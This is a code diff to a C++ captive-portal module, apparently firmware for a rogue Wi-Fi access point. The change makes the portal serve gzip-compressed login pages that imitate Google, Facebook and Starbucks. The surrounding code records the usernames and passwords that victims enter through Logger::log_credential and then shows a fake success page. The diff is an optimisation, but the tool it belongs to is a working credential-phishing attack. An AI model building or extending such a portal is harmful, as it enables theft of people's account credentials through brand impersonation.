@@ -59,14 +59,31 @@ void CaptivePortal::setupRoutes() {
             }
         }
         
-        const char* html = GENERIC_LOGIN_HTML;
+        const uint8_t* html_gz = GENERIC_HTML_GZ;
+        uint32_t html_gz_len = GENERIC_HTML_GZ_LEN;
+        
         switch(currentTemplate) {
-            case TEMPLATE_GOOGLE: html = GOOGLE_LOGIN_HTML; break;
-            case TEMPLATE_FACEBOOK: html = FACEBOOK_LOGIN_HTML; break;
-            case TEMPLATE_STARBUCKS: html = STARBUCKS_LOGIN_HTML; break;
-            default: html = GENERIC_LOGIN_HTML; break;
+            case TEMPLATE_GOOGLE: 
+                html_gz = GOOGLE_HTML_GZ; 
+                html_gz_len = GOOGLE_HTML_GZ_LEN; 
+                break;
+            case TEMPLATE_FACEBOOK: 
+                html_gz = FACEBOOK_HTML_GZ; 
+                html_gz_len = FACEBOOK_HTML_GZ_LEN; 
+                break;
+            case TEMPLATE_STARBUCKS: 
+                html_gz = STARBUCKS_HTML_GZ; 
+                html_gz_len = STARBUCKS_HTML_GZ_LEN; 
+                break;
+            default: 
+                html_gz = GENERIC_HTML_GZ; 
+                html_gz_len = GENERIC_HTML_GZ_LEN; 
+                break;
         }
-        request->send(200, "text/html", html);
+        
+        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", html_gz, html_gz_len);
+        response->addHeader("Content-Encoding", "gzip");
+        request->send(response);
     });
 
     // Handle Login
@@ -78,7 +95,9 @@ void CaptivePortal::setupRoutes() {
         
         Logger::log_credential(user, pass);
         
-        request->send(200, "text/html", SUCCESS_HTML);
+        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", SUCCESS_HTML_GZ, SUCCESS_HTML_GZ_LEN);
+        response->addHeader("Content-Encoding", "gzip");
+        request->send(response);
     });
 
     // 404 Redirect to Portal
